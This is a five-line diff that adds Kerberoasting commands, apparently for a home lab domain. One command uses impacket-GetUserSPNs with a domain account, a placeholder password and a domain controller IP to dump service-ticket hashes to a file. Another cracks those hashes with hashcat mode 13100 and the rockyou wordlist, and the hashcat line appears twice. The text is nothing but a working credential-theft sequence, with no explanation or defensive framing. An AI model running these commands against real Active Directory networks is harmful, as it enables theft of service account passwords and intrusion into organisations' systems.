@@ -1,0 +1,5 @@
+impacket-GetUserSPNs homelab.local/bjohnson:'<AD_PASSWORD>' \
+  -dc-ip 10.10.10.160 -outputfile roast.hashes
+
+hashcat -m 13100 roast.hashes /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 roast.hashes /usr/share/wordlists/rockyou.txt
